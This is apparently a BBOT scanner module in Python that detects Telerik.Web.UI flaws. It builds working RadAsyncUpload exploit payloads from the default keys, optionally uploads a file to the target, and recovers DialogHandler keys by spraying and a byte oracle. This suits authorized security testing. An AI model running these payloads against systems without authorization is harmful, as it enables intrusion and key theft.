import base64
import itertools

from Crypto.Cipher import AES
from badsecrets import modules_loaded

from bbot.modules.base import BaseModule
from bbot.core.config.models import BaseModuleConfig, Field


Telerik_HashKey = modules_loaded["telerik_hashkey"]
Telerik_EncryptionKey = modules_loaded["telerik_encryptionkey"]


# Default RAU keys shipped with Telerik.Web.UI pre-R2 2017 SP2 (CVE-2017-11317).
RAU_DEFAULT_ENC_KEY = "PrivateKeyForEncryptionOfRadAsyncUploadConfiguration"
RAU_DEFAULT_HASH_KEY = "PrivateKeyForHashOfUploadConfiguration"


class telerik(BaseModule):
    """
    Detect Telerik.Web.UI vulnerabilities:

      - CVE-2017-11317: RadAsyncUpload insecure deserialization (RAU)
      - CVE-2017-9248:  DialogHandler dp encryption-key leak (oracle + known keys)
      - CVE-2019-19790: ChartImage.axd path traversal / SpellCheckHandler exposure

    Handler surfaces detected: RAU (Telerik.Web.UI.WebResource.axd?type=rau),
    DialogHandler (Telerik.Web.UI.DialogHandler.aspx and variants),
    SpellCheckHandler (Telerik.Web.UI.SpellCheckHandler.axd), ChartImage.axd, and
    SerializedParameters / _serializedConfiguration blobs surfacing in HTTP responses.

    CVE-2024-4358 (Telerik Report Server auth bypass) is not covered here; use the
    projectdiscovery/nuclei-templates CVE-2024-4358 template.
    """

    watched_events = ["URL", "HTTP_RESPONSE"]
    produced_events = ["FINDING"]
    flags = ["active", "loud", "invasive", "web-heavy"]
    meta = {
        "description": "Scan for critical Telerik vulnerabilities",
        "created_date": "2022-04-10",
        "author": "@liquidsec",
    }

    telerik_versions = [
        "2007.1423",
        "2007.1521",
        "2007.1626",
        "2007.2918",
        "2007.21010",
        "2007.21107",
        "2007.31218",
        "2007.31314",
        "2007.31425",
        "2008.1415",
        "2008.1515",
        "2008.1619",
        "2008.2723",
        "2008.2826",
        "2008.21001",
        "2008.31105",
        "2008.31125",
        "2008.31314",
        "2009.1311",
        "2009.1402",
        "2009.1527",
        "2009.2701",
        "2009.2826",
        "2009.31103",
        "2009.31208",
        "2009.31314",
        "2010.1309",
        "2010.1415",
        "2010.1519",
        "2010.2713",
        "2010.2826",
        "2010.2929",
        "2010.31109",
        "2010.31215",
        "2010.31317",
        "2011.1315",
        "2011.1413",
        "2011.1519",
        "2011.2712",
        "2011.2915",
        "2011.31115",
        "2011.3.1305",
        "2012.1.215",
        "2012.1.411",
        "2012.2.607",
        "2012.2.724",
        "2012.2.912",
        "2012.3.1016",
        "2012.3.1205",
        "2012.3.1308",
        "2013.1.220",
        "2013.1.403",
        "2013.1.417",
        "2013.2.611",
        "2013.2.717",
        "2013.3.1015",
        "2013.3.1114",
        "2013.3.1324",
        "2014.1.225",
        "2014.1.403",
        "2014.2.618",
        "2014.2.724",
        "2014.3.1024",
        "2015.1.204",
        "2015.1.225",
        "2015.2.604",
        "2015.2.623",
        "2015.2.729",
        "2015.2.826",
        "2015.3.930",
        "2015.3.1111",
        "2016.1.113",
        "2016.1.225",
        "2016.2.504",
        "2016.2.607",
        "2016.3.914",
        "2016.3.1018",
        "2016.3.1027",
        "2016.1.1213",
        "2017.1.118",
        "2017.1.228",
        "2017.2.503",
        "2017.2.621",
        "2017.2.711",
        "2017.3.913",
    ]

    dialoghandler_urls = [
        "Telerik.Web.UI.DialogHandler.aspx",
        "Telerik.Web.UI.DialogHandler.axd",
        "Admin/ServerSide/Telerik.Web.UI.DialogHandler.aspx",
        "App_Master/Telerik.Web.UI.DialogHandler.aspx",
        "AsiCommon/Controls/ContentManagement/ContentDesigner/Telerik.Web.UI.DialogHandler.aspx",
        "cms/portlets/telerik.web.ui.dialoghandler.aspx",
        "common/admin/Calendar/Telerik.Web.UI.DialogHandler.aspx",
        "common/admin/Jobs2/Telerik.Web.UI.DialogHandler.aspx",
        "common/admin/PhotoGallery2/Telerik.Web.UI.DialogHandler.aspx",
        "dashboard/UserControl/CMS/Page/Telerik.Web.UI.DialogHandler.aspx",
        "DesktopModule/UIQuestionControls/UIAskQuestion/Telerik.Web.UI.DialogHandler.aspx",
        "Desktopmodules/Admin/dnnWerk.Users/DialogHandler.aspx",
        "DesktopModules/Admin/RadEditorProvider/DialogHandler.aspx",
        "desktopmodules/base/editcontrols/telerik.web.ui.dialoghandler.aspx",
        "desktopmodules/dnnwerk.radeditorprovider/dialoghandler.aspx",
        "DesktopModules/RadEditorProvider/telerik.web.ui.dialoghandler.aspx",
        "desktopmodules/tcmodules/tccategory/telerik.web.ui.dialoghandler.aspx",
        "desktopmodules/telerikwebui/radeditorprovider/telerik.web.ui.dialoghandler.aspx",
        "DesktopModules/TNComments/Telerik.Web.UI.DialogHandler.aspx",
        "dotnetnuke/DesktopModules/Admin/RadEditorProvider/DialogHandler.aspx",
        "Modules/CMS/Telerik.Web.UI.DialogHandler.aspx",
        "modules/shop/manage/telerik.web.ui.dialoghandler.aspx",
        "portal/channels/fa/Cms_HtmlText_Manage/Telerik.Web.UI.DialogHandler.aspx",
        "providers/htmleditorproviders/telerik/telerik.web.ui.dialoghandler.aspx",
        "Resources/Telerik.Web.UI.DialogHandler.aspx",
        "sitecore/shell/applications/contentmanager/telerik.web.ui.dialoghandler.aspx",
        "sitecore/shell/Controls/RichTextEditor/Telerik.Web.UI.DialogHandler.aspx",
        "Sitefinity/ControlTemplates/Blogs/Telerik.Web.UI.DialogHandler.aspx",
        "SiteTemplates/Telerik.Web.UI.DialogHandler.aspx",
        "static/usercontrols/Telerik.Web.UI.DialogHandler.aspx",
        "system/providers/htmleditor/Telerik.Web.UI.DialogHandler.aspx",
        "WebUIDialogs/Telerik.Web.UI.DialogHandler.aspx",
    ]

    class Config(BaseModuleConfig):
        exploit_rau: bool = Field(
            False,
            description="Attempt to confirm RAU RCE with default keys. Uploads a benign file if successful.",
        )
        include_subdirs: bool = Field(
            False,
            description="Probe every discovered subdirectory instead of only the site root.",
        )
        try_known_keys: bool = Field(
            True,
            description="After DialogHandler detection, spray known Telerik hash/encryption keys (via badsecrets).",
        )
        probe_dialoghandler_oracle: bool = Field(
            True,
            description="After DialogHandler detection, probe for CVE-2017-9248 oracle-vulnerable state.",
        )
        include_machinekeys: bool = Field(
            False,
            description="Also spray ASP.NET machineKey values (thousands of keys, much slower).",
        )

    in_scope_only = True

    deps_pip = ["badsecrets~=1.2.1"]

    _module_threads = 5

    async def setup(self):
        self._rau_confirmed = set()
        self._enc = Telerik_EncryptionKey()
        self._hash = Telerik_HashKey()
        return True

    @staticmethod
    def _normalize_url(url):
        return str(url.rstrip("/") + "/").lower()

    def _incoming_dedup_hash(self, event):
        if event.type == "URL":
            if self.config.get("include_subdirs") is True:
                return hash(f"{event.type}{self._normalize_url(event.url)}")
            return hash(f"{event.type}{event.netloc}")
        return hash(f"{event.type}{event.url}")

    async def filter_event(self, event):
        if event.type == "URL" and "endpoint" in event.tags:
            return False
        return True

    async def handle_event(self, event):
        if event.type == "URL":
            base_url = self._base_url(event)
            await self._probe_rau(base_url, event)
            dh_url = await self._probe_dialoghandler(base_url, event)
            if dh_url:
                await self._probe_dialoghandler_exploit(dh_url, event)
            await self._probe_spellcheck(base_url, event)
            await self._probe_chartimage(base_url, event)
        elif event.type == "HTTP_RESPONSE":
            await self._carve_http_response(event)

    async def _probe_dialoghandler_exploit(self, dh_url, event):
        """
        Known-key spray first (definitive: recovers the actual keys). If nothing matches,
        fall back to the dp_cryptomg baseline probe (chosen-plaintext byte-oracle test).
        Oracle only runs on PBKDF1_MS targets; the CVE-2017-9248 patch moved to PBKDF2
        specifically to defeat this attack, so probing PBKDF2 is wasted requests.
        """
        kdf_mode = None
        if self.config.get("try_known_keys"):
            kdf_mode = await self._detect_kdf_mode(dh_url)
            if kdf_mode in ("PBKDF1_MS", "PBKDF2"):
                if await self._probe_dialoghandler_knownkey(dh_url, event, kdf_mode):
                    return
        if self.config.get("probe_dialoghandler_oracle"):
            if kdf_mode is None:
                kdf_mode = await self._detect_kdf_mode(dh_url)
            if kdf_mode == "PBKDF1_MS":
                await self._probe_dialoghandler_oracle(dh_url, event)

    def _base_url(self, event):
        if self.config.get("include_subdirs"):
            return self._normalize_url(event.url)
        return f"{event.parsed_url.scheme}://{event.parsed_url.netloc}/"

    # -----------------------------------------------------------------------
    # RAU (CVE-2017-11317)
    # -----------------------------------------------------------------------

    # (KDF mode, HMAC on/off) combinations to try in the safe default-keys probe.
    # Covers pre-2017 (PBKDF1_MS + no HMAC), the PBKDF1_MS + HMAC window (2017.1.118 - 2018.1.117),
    # and post-PBKDF2 (2018.2+). Any combo hitting the "Could not load file or assembly" signal
    # proves the target accepts default keys without triggering a file upload.
    _RAU_PROBE_VARIANTS = (
        ("PBKDF1_MS", False),
        ("PBKDF1_MS", True),
        ("PBKDF2", True),
    )
    _RAU_FAKE_VERSION = "9999.9.999"

    async def _probe_rau(self, base_url, event):
        webresource = "Telerik.Web.UI.WebResource.axd?type=rau"
        url = f"{base_url}{webresource}"
        result = await self.helpers.request(url, timeout=self.scan.http_timeout)
        if not result or "RadAsyncUpload handler is registered succesfully" not in result.text:
            return
        self.verbose(f"Detected Telerik RAU handler at {url}")

        await self.emit_event(
            {
                "host": str(event.host),
                "url": url,
                "description": "Telerik RAU handler detected",
                "name": "Telerik RAU Handler",
                "severity": "INFO",
                "confidence": "HIGH",
            },
            "FINDING",
            event,
            context=f"{{module}} scanned {base_url} and identified {{event.type}}: Telerik RAU Handler",
        )

        # Safe probe: fake-version payload with default keys. Assembly load fails before file write,
        # so a hit proves the crypto works without persisting anything on the target.
        await self._probe_rau_default_keys(url, event)

        if self.config.get("exploit_rau") and base_url not in self._rau_confirmed:
            self._rau_confirmed.add(base_url)
            await self._confirm_rau_knownkey(url, event, base_url)

    async def _probe_rau_default_keys(self, url, event):
        """
        Send fake-version payloads with default keys across each (KDF, HMAC) variant.
        Response `Could not load file or assembly` = crypto succeeded, .NET failed to load
        the bogus assembly type -> default keys accepted, no file uploaded.
        """
        for kdf_mode, include_hmac in self._RAU_PROBE_VARIANTS:
            payload = self._build_rau_multipart(
                self._RAU_FAKE_VERSION, RAU_DEFAULT_ENC_KEY, RAU_DEFAULT_HASH_KEY, kdf_mode, include_hmac
            )
            response = await self.helpers.request(url, method="POST", files=payload)
            if not response or "Could not load file or assembly" not in response.text:
                continue
            self.debug(f"RAU default keys accepted (KDF={kdf_mode}, HMAC={include_hmac})")
            await self.emit_event(
                {
                    "host": str(event.host),
                    "url": url,
                    "description": (
                        f"Telerik RAU accepts default keys (KDF={kdf_mode}, HMAC={include_hmac}). "
                        "RCE is achievable once the exact installed Telerik version is identified; "
                        "no file was uploaded by this probe."
                    ),
                    "name": "Telerik RAU Default Keys Accepted (CVE-2017-11317)",
                    "severity": "HIGH",
                    "confidence": "HIGH",
                },
                "FINDING",
                event,
                context=f"{{module}} confirmed default RAU keys at {url} without uploading",
            )
            return

    async def _confirm_rau_knownkey(self, url, event, base_url):
        """
        Version-identification + exploit. Iterate real Telerik versions with default keys;
        the one producing `{"fileInfo":` also uploads the benign 1-byte probe file to the
        target's C:\\Windows\\Temp\\. Only runs when exploit_rau=True.
        """
        for version in self.telerik_versions:
            if int(version[:4]) <= 2017 or version == "2018.1.117":
                kdf_mode = "PBKDF1_MS"
            else:
                kdf_mode = "PBKDF2"
            include_hmac = int(version[:4]) >= 2017
            payload = self._build_rau_multipart(
                version, RAU_DEFAULT_ENC_KEY, RAU_DEFAULT_HASH_KEY, kdf_mode, include_hmac
            )
            response = await self.helpers.request(url, method="POST", files=payload)
            if response and '"fileInfo":' in response.text:
                self.debug(f"Confirmed RAU RCE (version: {version})")
                await self.emit_event(
                    {
                        "host": str(event.host),
                        "url": url,
                        "description": f"Confirmed Telerik RAU RCE (version: {version}, key: default)",
                        "name": "Telerik RAU RCE (CVE-2017-11317)",
                        "severity": "CRITICAL",
                        "confidence": "CONFIRMED",
                    },
                    "FINDING",
                    event,
                    context=f"{{module}} confirmed {{event.type}}: Telerik RAU RCE at {base_url}",
                )
                return

    def _rau_encrypt(self, plaintext, key, iv):
        """AES-256-CBC with the null-byte-interleaved plaintext encoding Telerik RAU uses."""
        interleaved = "".join(c + "\x00" for c in plaintext)
        pad_len = 16 - (len(interleaved) % 16)
        padded = interleaved + (chr(pad_len) * pad_len)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return base64.b64encode(cipher.encrypt(padded.encode())).decode()

    def _rau_sign(self, ciphertext_b64, hash_key, include_hmac):
        if not include_hmac:
            return ciphertext_b64
        from Crypto.Hash import HMAC, SHA256

        h = HMAC.new(key=hash_key.encode(), msg=ciphertext_b64.encode(), digestmod=SHA256.new())
        return f"{ciphertext_b64}{base64.b64encode(h.digest()).decode()}"

    def _build_rau_multipart(self, assembly_version, enc_key, hash_key, kdf_mode, include_hmac):
        """Build the httpx `files=` dict for a RAU payload with explicit KDF + HMAC choices."""
        if kdf_mode == "PBKDF1_MS":
            key, iv = self._enc.telerik_derivekeys_PBKDF1_MS(enc_key)
        else:
            key, iv = self._enc.telerik_derivekeys_PBKDF2(enc_key)

        enc_target_folder = self._rau_sign(self._rau_encrypt("", key, iv), hash_key, include_hmac)
        enc_temp_folder = self._rau_sign(self._rau_encrypt("C:\\Windows\\Temp\\", key, iv), hash_key, include_hmac)
        rau_post_data_json = (
            f'{{"TargetFolder":"{enc_target_folder}",'
            f'"TempTargetFolder":"{enc_temp_folder}",'
            '"MaxFileSize":0,'
            '"TimeToLive":{"Ticks":1440000000000,"Days":0,"Hours":40,"Minutes":0,'
            '"Seconds":0,"Milliseconds":0,"TotalDays":1.6666666666666666,'
            '"TotalHours":40,"TotalMinutes":2400,"TotalSeconds":144000,"TotalMilliseconds":144000000},'
            '"UseApplicationPoolImpersonation":false}'
        )
        assembly_type = (
            f"Telerik.Web.UI.AsyncUploadConfiguration, Telerik.Web.UI, Version={assembly_version}, "
            "Culture=neutral, PublicKeyToken=121fae78165ba3d4"
        )
        rau_post_data = f"{self._rau_encrypt(rau_post_data_json, key, iv)}&{self._rau_encrypt(assembly_type, key, iv)}"
        upload_id = self.helpers.rand_string(12).lower() + ".txt"
        return {
            "rauPostData": (None, rau_post_data),
            "file": ("blob", b"\x00", "application/octet-stream"),
            "fileName": (None, self.helpers.rand_string(8)),
            "contentType": (None, "text/html"),
            "lastModifiedDate": (None, "2020-01-02T08:02:01.067Z"),
            "metadata": (
                None,
                f'{{"TotalChunks":1,"ChunkIndex":0,"TotalFileSize":1,"UploadID":"{upload_id}"}}',
            ),
        }

    # -----------------------------------------------------------------------
    # DialogHandler (CVE-2017-9248)
    # -----------------------------------------------------------------------

    async def _probe_dialoghandler(self, base_url, event):
        """
        Try the default path first (sequential) — DialogHandler is a global handler that
        responds identically regardless of path, so on a real target the default path
        almost always works and produces a less confusing finding URL. Only fan out to
        the extended candidate list if the default doesn't match.
        """
        if not self.dialoghandler_urls:
            return None

        default_dh = self.dialoghandler_urls[0]
        default_response = await self.helpers.request(f"{base_url}{default_dh}?dp=1", timeout=self.scan.http_timeout)
        if default_response and "Cannot deserialize dialog parameters" in default_response.text:
            return await self._emit_dialoghandler(base_url, default_dh, event)

        remaining = {f"{base_url}{dh}?dp=1": dh for dh in self.dialoghandler_urls[1:]}
        if not remaining:
            return None

        fail_count = 0
        async for url, response in self.helpers.request_batch_stream(list(remaining)):
            if response is None:
                fail_count += 1
                if fail_count < 2:
                    continue
                self.debug(f"Cancelling DialogHandler probe against {base_url} after repeated failures")
                return None
            if "Cannot deserialize dialog parameters" not in response.text:
                continue
            return await self._emit_dialoghandler(base_url, remaining[url], event)
        return None

    async def _emit_dialoghandler(self, base_url, dh, event):
        dh_url = f"{base_url}{dh}"
        self.debug(f"Detected Telerik DialogHandler ({dh})")
        await self.emit_event(
            {
                "host": str(event.host),
                "url": dh_url,
                "description": "Telerik DialogHandler detected",
                "name": "Telerik DialogHandler",
                "confidence": "CONFIRMED",
                "severity": "INFO",
            },
            "FINDING",
            event,
            context=f"{{module}} scanned {base_url} and identified {{event.type}}: Telerik DialogHandler",
        )
        return dh_url

    async def _detect_kdf_mode(self, dh_url):
        """Send an empty probe; response error tells us which KDF the target uses."""
        response = await self.helpers.request(dh_url, method="POST", data={"dialogParametersHolder": "AAAA"})
        if not response:
            return None
        return self._classify_kdf_response(response.text)

    @staticmethod
    def _classify_kdf_response(text):
        if (
            "Exception of type 'System.Exception' was thrown" in text
            or "The cryptographic operation has failed!" in text
        ):
            return "PBKDF2"
        if "Length cannot be less than zero" in text:
            return "PBKDF1_MS"
        if "Invalid length for a Base-64 char array or string" in text:
            return "PATCHED"
        return None

    async def _probe_dialoghandler_oracle(self, dh_url, event):
        """
        Port of dp_cryptomg's find_baseline(): send crafted GET ?dp=<base64(4 bytes)>
        payloads iterating combinations of [0x00, 0x6b, 0x08]. A response containing
        `Index was outside the bounds of the array.` or `String was not recognized as a
        valid Boolean.` proves the byte-oracle leaks decryption state and CVE-2017-9248
        byte-by-byte key recovery is feasible against this target.
        """
        test_bytes = [b"\x00", b"\x6b", b"\x08"]
        for combo in itertools.product(test_bytes, repeat=4):
            payload = base64.b64encode(b"".join(combo)).decode()
            response = await self.helpers.request(f"{dh_url}?dp={payload}", timeout=self.scan.http_timeout)
            if not response:
                continue
            text = response.text
            if (
                "Index was outside the bounds of the array." in text
                or "String was not recognized as a valid Boolean." in text
            ):
                self.debug(f"CVE-2017-9248 baseline hit on combo {combo!r}")
                await self.emit_event(
                    {
                        "host": str(event.host),
                        "url": dh_url,
                        "description": (
                            "Telerik DialogHandler is exploitable via CVE-2017-9248 byte-oracle "
                            "key recovery (baseline probe leaked decryption state)"
                        ),
                        "name": "Telerik DialogHandler Oracle (CVE-2017-9248)",
                        "severity": "CRITICAL",
                        "confidence": "CONFIRMED",
                    },
                    "FINDING",
                    event,
                    context=f"{{module}} confirmed CVE-2017-9248 byte-oracle at {dh_url}",
                )
                return True
        return False

    async def _probe_dialoghandler_knownkey(self, dh_url, event, kdf_mode):
        """Returns True if a known key pair was recovered and a finding emitted."""
        include_machinekeys = self.config.get("include_machinekeys", False)
        if kdf_mode == "PBKDF1_MS":
            hash_key = await self._solve_dh_hashkey(dh_url, include_machinekeys)
            if not hash_key:
                return False
            enc_key = await self._solve_dh_enckey(dh_url, hash_key, kdf_mode, include_machinekeys)
            if not enc_key:
                return False
        elif kdf_mode == "PBKDF2":
            match = await self._solve_dh_pbkdf2_combined(dh_url, include_machinekeys)
            if not match:
                return False
            hash_key, enc_key = match
        else:
            return False

        await self.emit_event(
            {
                "host": str(event.host),
                "url": dh_url,
                "description": (
                    f"Telerik DialogHandler configured with a known hash/encryption key pair. "
                    f"Hash key: [{hash_key}] Encryption key: [{enc_key}] KDF: [{kdf_mode}]"
                ),
                "name": "Telerik DialogHandler Known Key (CVE-2017-9248)",
                "severity": "CRITICAL",
                "confidence": "CONFIRMED",
            },
            "FINDING",
            event,
            context=f"{{module}} recovered a known Telerik key pair at {dh_url}",
        )
        return True

    async def _solve_dh_hashkey(self, dh_url, include_machinekeys):
        """PBKDF1_MS mode: hashkey solves independently via 'input data is not a complete block' oracle."""
        for probe, hash_key in self._hash.hashkey_probe_generator(include_machinekeys=include_machinekeys):
            response = await self.helpers.request(dh_url, method="POST", data={"dialogParametersHolder": probe})
            if not response:
                continue
            if "The input data is not a complete block" in response.text:
                self.debug(f"Matched Telerik hash key: {hash_key}")
                return hash_key
        return None

    async def _solve_dh_enckey(self, dh_url, hash_key, kdf_mode, include_machinekeys):
        """Once hashkey is known, enckey solves via 'Index was outside the bounds of the array' oracle."""
        for probe, enc_key in self._enc.encryptionkey_probe_generator(
            hash_key, kdf_mode, include_machinekeys=include_machinekeys
        ):
            response = await self.helpers.request(dh_url, method="POST", data={"dialogParametersHolder": probe})
            if not response:
                continue
            if "Index was outside the bounds of the array" in response.text:
                self.debug(f"Matched Telerik encryption key: {enc_key}")
                return enc_key
        return None

    async def _solve_dh_pbkdf2_combined(self, dh_url, include_machinekeys):
        """
        PBKDF2 mode: no per-key oracle, only response-size delta from a dummy baseline.
        We spray hash × enc combinations; the true pair produces a response ~10+ bytes off baseline.
        """
        baseline_probe = self._build_pbkdf2_probe("dummy", "dummy")
        baseline = await self.helpers.request(dh_url, method="POST", data={"dialogParametersHolder": baseline_probe})
        if not baseline:
            return None
        baseline_size = len(baseline.text)
        for hash_key in self._hash.prepare_keylist(include_machinekeys=include_machinekeys):
            for enc_key in self._enc.prepare_keylist(include_machinekeys=include_machinekeys):
                probe = self._build_pbkdf2_probe(hash_key, enc_key)
                response = await self.helpers.request(dh_url, method="POST", data={"dialogParametersHolder": probe})
                if not response:
                    continue
                if abs(len(response.text) - baseline_size) > 10:
                    self.debug(f"Matched Telerik PBKDF2 key pair: {hash_key} / {enc_key}")
                    return hash_key, enc_key
        return None

    def _build_pbkdf2_probe(self, hash_key, enc_key):
        plaintext = "EnableAsyncUpload,False,3,True;AllowMultipleSelection,False,3,False"
        derived_key, derived_iv = self._enc.telerik_derivekeys(enc_key, "PBKDF2")
        ct = self._enc.telerik_encrypt(derived_key, derived_iv, plaintext)
        return self._hash.sign_enc_dialog_params(hash_key, ct)

    # -----------------------------------------------------------------------
    # SpellCheckHandler
    # -----------------------------------------------------------------------

    async def _probe_spellcheck(self, base_url, event):
        url = f"{base_url}Telerik.Web.UI.SpellCheckHandler.axd"
        result = await self.helpers.request(url, timeout=self.scan.http_timeout)
        if getattr(result, "status_code", 0) != 500:
            return
        # False-positive filter: sites that 500 on every unknown .axd.
        validate_url = f"{base_url}{self.helpers.rand_string()}.axd"
        validate_result = await self.helpers.request(validate_url, timeout=self.scan.http_timeout)
        if getattr(validate_result, "status_code", 0) in (0, 500):
            return
        self.debug("Detected Telerik SpellCheckHandler")
        await self.emit_event(
            {
                "host": str(event.host),
                "url": url,
                "description": "Telerik SpellCheckHandler detected",
                "name": "Telerik SpellCheckHandler",
                "confidence": "CONFIRMED",
                "severity": "INFO",
            },
            "FINDING",
            event,
            context=f"{{module}} scanned {base_url} and identified {{event.type}}: Telerik SpellCheckHandler",
        )

    # -----------------------------------------------------------------------
    # ChartImage.axd
    # -----------------------------------------------------------------------

    async def _probe_chartimage(self, base_url, event):
        canary = "ChartImage.axd?ImageName=bqYXJAqm315eEd6b%2bY4%2bGqZpe7a1kY0e89gfXli%2bjFw%3d"
        result = await self.helpers.request(f"{base_url}{canary}", timeout=self.scan.http_timeout)
        if getattr(result, "status_code", 0) != 200:
            return
        error_probe = "ChartImage.axd?ImageName="
        result_error = await self.helpers.request(f"{base_url}{error_probe}", timeout=self.scan.http_timeout)
        if getattr(result_error, "status_code", 0) in (0, 200):
            return
        await self.emit_event(
            {
                "host": str(event.host),
                "url": f"{base_url}{canary}",
                "description": "Telerik ChartImage AXD Handler detected",
                "name": "Telerik ChartImage Handler",
                "confidence": "CONFIRMED",
                "severity": "INFO",
            },
            "FINDING",
            event,
            context=f"{{module}} scanned {base_url} and identified {{event.type}}: Telerik ChartImage Handler",
        )

    # -----------------------------------------------------------------------
    # Passive HTTP_RESPONSE carve
    # -----------------------------------------------------------------------

    async def _carve_http_response(self, event):
        body = event.body
        if not body:
            return
        if '":{"SerializedParameters":"' in body:
            await self.emit_event(
                {
                    "host": str(event.host),
                    "url": event.url,
                    "description": "Telerik DialogHandler [SerializedParameters] detected in HTTP response",
                    "name": "Telerik DialogHandler",
                    "confidence": "CONFIRMED",
                    "severity": "INFO",
                },
                "FINDING",
                event,
                context="{module} searched HTTP_RESPONSE and identified {event.type}: Telerik DialogHandler",
            )
        elif '"_serializedConfiguration":"' in body:
            await self.emit_event(
                {
                    "host": str(event.host),
                    "url": event.url,
                    "description": "Telerik AsyncUpload [serializedConfiguration] detected in HTTP response",
                    "name": "Telerik AsyncUpload",
                    "confidence": "CONFIRMED",
                    "severity": "INFO",
                },
                "FINDING",
                event,
                context="{module} searched HTTP_RESPONSE and identified {event.type}: Telerik AsyncUpload",
            )
